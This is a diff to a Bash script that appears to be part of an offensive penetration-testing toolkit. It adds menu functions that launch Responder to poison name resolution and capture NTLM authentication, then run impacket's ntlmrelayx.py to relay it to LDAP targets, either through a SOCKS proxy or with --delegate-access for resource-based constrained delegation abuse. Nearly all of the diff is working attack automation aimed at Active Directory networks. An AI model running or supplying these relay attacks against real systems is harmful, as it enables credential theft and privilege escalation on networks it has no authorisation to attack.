@@ -242,15 +242,78 @@ function ntlmrelay_smb_socks() {
                         2) smb_socks_multi ;;
                         *) echo -e "Invalid command entered... exiting\n\n";
                 esac
-
 }
 
 function ntlmrelay_ldap_socks() {
-        echo "temp"
+       ldap_socks_solo() {
+                ColorCyan 'Enter target host: '
+                read solo_target
+                export solo_target=$solo_target
+                echo -e '[*] Setting up Responder + Ntlmrelayx.py to one LDAP target (socks)...\n'
+                tmux new-window -e "solo_target=${solo_target}" -n "relay"
+                tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+                tmux split-window -e "solo_target=${solo_target}" -h -l 50%
+                tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support -socks -wh fake-wpad' C-m
+        }
+        ldap_socks_multi() {
+                if test -f "loot/ldap_targets.txt"; then
+                        echo -e '[*] Setting up Responder + Ntlmrelayx.py to LDAP targets file (socks)...\n'
+                        tmux new-window -n "relay"
+                        tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+                        tmux split-window -h -l 50%
+                        tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                        tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/ldap_targets.txt -smb2support -socks -wh fake-wpad' C-m
+                else
+                        echo -ne $red'[-] ERROR: ldap_targets.txt does not exist.\nTry running the Enum -> SMB enumeration module\n'$clear
+                fi
+        }
+        ColorCyan '\nRelay to an individual host or a list of targets?\n'
+        ColorGreen '1)' && echo -e " Specific host"
+        ColorGreen '2)' && echo -e " Targets file"
+        ColorCyan 'Choose an option: '
+                read a
+                case $a in
+                        1) ldap_socks_solo ;;
+                        2) ldap_socks_multi ;;
+                        *) echo -e "Invalid command entered... exiting\n\n";
+                esac
 }
 
 function ntlmrelay_ldap_rbcd() {
-        echo "temp"
+       ldap_rbcd_solo() {
+                ColorCyan 'Enter target host: '
+                read solo_target
+                export solo_target=$solo_target
+                echo -e '[*] Setting up Responder + Ntlmrelayx.py to one LDAP target (rbcd)...\n'
+                tmux new-window -e "solo_target=${solo_target}" -n "relay"
+                tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+                tmux split-window -e "solo_target=${solo_target}" -h -l 50%
+                tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support --delegate-access -wh fake-wpad' C-m
+        }
+        ldap_rbcd_multi() {
+                if test -f "loot/ldap_targets.txt"; then
+                        echo -e '[*] Setting up Responder + Ntlmrelayx.py to LDAP targets file (rbcd)...\n'
+                        tmux new-window -n "relay"
+                        tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+                        tmux split-window -h -l 50%
+                        tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                        tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/ldap_targets.txt -smb2support --delegate-access -wh fake-wpad' C-m
+                else
+                        echo -ne $red'[-] ERROR: ldap_targets.txt does not exist.\nTry running the Enum -> SMB enumeration module\n'$clear
+                fi
+        }
+        ColorCyan '\nRelay to an individual host or a list of targets?\n'
+        ColorGreen '1)' && echo -e " Specific host"
+        ColorGreen '2)' && echo -e " Targets file"
+        ColorCyan 'Choose an option: '
+                read a
+                case $a in
+                        1) ldap_rbcd_solo ;;
+                        2) ldap_rbcd_multi ;;
+                        *) echo -e "Invalid command entered... exiting\n\n";
+                esac
 }
 
 ## TODO
